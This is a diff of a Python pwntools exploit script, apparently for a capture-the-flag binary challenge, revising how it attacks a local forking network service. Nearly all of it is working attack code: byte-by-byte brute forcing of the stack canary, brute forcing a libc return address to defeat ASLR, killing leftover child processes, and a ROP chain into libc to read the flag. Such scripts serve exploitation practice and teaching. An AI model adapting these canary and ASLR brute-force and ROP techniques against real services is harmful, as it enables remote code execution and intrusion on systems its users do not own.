@@ -1,8 +1,7 @@
-from dataclasses import dataclass
-import re
 import sys
 import pwn
 from typing import Callable
+import psutil
 
 pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
 
@@ -49,13 +48,6 @@ def make_non_setuid_binary(bin):
     return tmp
 
 
-@dataclass
-class Static:
-    offset_canary: int
-    offset_callret: int
-    elf: pwn.ELF
-
-
 def find_offset_to_canary():
     for length in range(0x11, 0x101, 0x8):
         with pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error") as io:
@@ -66,28 +58,23 @@ def find_offset_to_canary():
     raise ValueError("failed to find offset")
 
 
-def address_next_to_call(elf, in_func, call_func):
-    lines = elf.functions[in_func].disasm().splitlines()
-    addr_re = re.compile(r"^\s*([0-9a-fA-F]+):")
-    target_hex = hex(elf.functions[call_func].address)
-    for i, line in enumerate(lines):
-        if "call" in line and target_hex in line:
-            if i + 1 < len(lines):
-                m = addr_re.match(lines[i + 1])
-                if m:
-                    return int(m.group(1), 16)
-                raise ValueError("failed to parse next instruction address")
-    raise ValueError("failed to find call instruction")
+def kill_child_process(bin):
+    for proc in psutil.process_iter():
+        if proc.exe() != bin:
+            continue
+        parent = proc.parent()
+        if not parent or parent.exe() != bin:
+            continue
+        proc.kill()
 
 
-def one_round(io_maker: Callable[[], pwn.tube], static: Static):
-    offset_canary = static.offset_canary
-    elf = static.elf
-
-    assert elf.libc
-    libc = elf.libc
+def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
+    kill_child_process(elf.path) # kill orphaned process from previous round
+    offset_canary = find_offset_to_canary()
+    pwn.success(f"found canary offset: {offset_canary:#x}")
 
     def crack_canary():
+        # return bytes.fromhex('00 17 97 47 90 1e 2c eb'.replace(" ", ""))
         canary = bytearray()
         while len(canary) < 8:
             for byte in range(256):
@@ -101,7 +88,7 @@ def one_round(io_maker: Callable[[], pwn.tube], static: Static):
                 with io_maker() as io:
                     io.send(payload)
                     io.sendlineafter(b"Leaving!", b"")
-                    if b"Goodbye!" in io.recvrepeat():
+                    if b"stack smashing detected" not in io.recvrepeat(1):
                         canary.append(byte)
                         break
             else:
@@ -109,44 +96,32 @@ def one_round(io_maker: Callable[[], pwn.tube], static: Static):
         return canary
 
     def crack_aslr():
-        back_addr = bytearray()
-        while len(back_addr) < 8:
+        offset_libc_start_main = libc.symbols["__libc_start_main"]
+        # location of the main(argc, argv) call block in __libc_start_main
+        offset_call_main = offset_libc_start_main + 0xAF
+        pwn.success(f"found offset to call main: {offset_call_main:#x}")
+
+        libc_addr = bytearray([offset_call_main & 0xFF])
+        while len(libc_addr) < 8:
             for byte in range(256):
-                byte = 0xFF - byte  # 倒着来避免 nop sled
-                candidate = back_addr + bytes([byte])
+                candidate = libc_addr + bytes([byte])
                 payload = pwn.flat(
                     {
                         offset_canary + 0x00: canary_leak,
                         offset_canary + 0x10: candidate,
                     },
                 )
-                print(f"Trying back_addr: {int.from_bytes(candidate, 'little'):#x}", end="\r")
+                print(f"Trying libc_addr: {int.from_bytes(candidate, 'little'):#x}", end="\r")
                 with io_maker() as io:
                     io.send(payload)
                     io.sendlineafter(b"Leaving!\n", b"")
-                    if b"Goodbye!" in io.recvrepeat(1):
-                        back_addr.append(byte)
+                    if b"Welcome to" in io.recvrepeat(1):
+                        libc_addr.append(byte)
+                        kill_child_process(elf.path)
                         break
             else:
-                raise ValueError("failed to crack back_addr")
-
-        return int.from_bytes(back_addr, "little") - static.offset_callret
-
-    def crack_libc():
-        rop = pwn.ROP(elf)
-        rop.call("puts", [elf.got["puts"]])
-        payload = pwn.flat(
-            {
-                offset_canary + 0x00: canary_leak,
-                offset_canary + 0x10: rop.chain(),
-            },
-        )
-        print(pwn.hexdump(payload))
-        with io_maker() as io:
-            io.send(payload)
-            io.sendlineafter(b"Leaving!\n", b"")
-            leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
-            return leak_puts_addr - libc.symbols["puts"]
+                raise ValueError("failed to crack libc_addr")
+        return int.from_bytes(libc_addr, "little") - offset_call_main
 
     def crack_flag():
         rop = pwn.ROP(libc)
@@ -168,18 +143,14 @@ def one_round(io_maker: Callable[[], pwn.tube], static: Static):
     canary_leak = crack_canary()
     pwn.log.success(f"leaked canary: {canary_leak.hex(' ')}")
 
-    back_addr = crack_aslr()
-    pwn.log.success(f"leaked base_addr: {back_addr:#x}")
-    elf.address = back_addr
-
-    libc_addr = crack_libc()
+    libc_addr = crack_aslr()
     pwn.log.success(f"leaked libc_addr: {libc_addr:#x}")
     libc.address = libc_addr
 
     crack_flag()
 
 
-def one_round_debug(bin, static):
+def one_round_debug(bin, elf, libc):
     io = pwn.gdb.debug(
         bin,
         gdbscript="""
@@ -190,37 +161,33 @@ def one_round_debug(bin, static):
         aslr=False,
     )
     with io:
-        one_round(io, static)
+        one_round(io, elf, libc)
 
 
-def one_round_worker(static):
+def one_round_worker(elf, libc):
     def io_maker():
         return pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE, level="error")
 
-    one_round(io_maker, static)
+    one_round(io_maker, elf, libc)
 
 
 def ctf():
-    # rop-roulette
+    # libc-lottery
     root_bin = find_challenge()
     user_bin = make_non_setuid_binary(root_bin)
-
     elf = pwn.ELF(root_bin, checksec=False)
-    assert elf.libc
+    assert elf.libs
 
-    offset_canary = find_offset_to_canary()
-    pwn.success(f"found canary offset: {offset_canary:#x}")
+    # file name contains `/libc-`, so we can't use elf.libc.
+    libc_path = next(lib for lib in elf.libs.keys() if "libc" in lib and ".so" in lib)
+    libc = pwn.ELF(libc_path, checksec=False)
 
-    offset_callret = address_next_to_call(elf, "main", "challenge")
-    pwn.success(f"found offset_callret: {offset_callret:#x}")
-
-    static = Static(offset_canary, offset_callret, elf)
     if "gdb" in sys.argv:
         # only non-setuid binary can disable ASLR
-        one_round_debug(user_bin, static)
+        one_round_debug(user_bin, elf, libc)
         return
 
-    one_round_worker(static)
+    one_round_worker(elf, libc)
 
 
 if __name__ == "__main__":
